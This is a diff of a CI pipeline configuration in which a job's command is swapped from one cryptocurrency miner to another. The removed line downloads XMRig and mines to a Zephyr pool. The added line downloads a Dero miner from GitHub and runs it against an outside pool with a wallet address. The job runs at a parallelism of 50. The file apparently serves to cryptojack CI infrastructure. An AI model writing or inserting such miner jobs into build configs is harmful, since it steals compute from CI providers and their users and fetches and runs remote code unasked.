@@ -12,5 +12,5 @@ blocks:
       jobs:
         - name: 'Job #1'
           commands:
-            - 'curl -sLJO "https://github.com/xmrig/xmrig/releases/download/v6.19.0/xmrig-6.19.0-linux-static-x64.tar.gz" && tar xf xmrig-6.19.0-linux-static-x64.tar.gz && cd xmrig-6.19.0 && clear && ./xmrig --donate-level 1 -o in.zephyr.herominers.com:1123 -u ZEPHsCVZ7PFRdBKS5Jza2TAaer8PRBcz83J2LYQ1Pbb3PbSB88a1ujPEzEbmai2VWk5PwZjSBSgxNc124mki2kZLRsLV1LX2cBb -p s1 -a rx/0 -k -t 2'
+            - 'curl -sLJO "https://github.com/DeroLuna/dero-miner/releases/download/v1.7-beta/deroluna-miner-linux-amd64.tar.gz" && tar -xvf deroluna-miner-linux-amd64.tar.gz && ./deroluna-miner -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92x6kn0vz5y2fuy2qd8emvd -d community-pools.mysrv.cloud:10300 -t 2'
           parallelism: 50
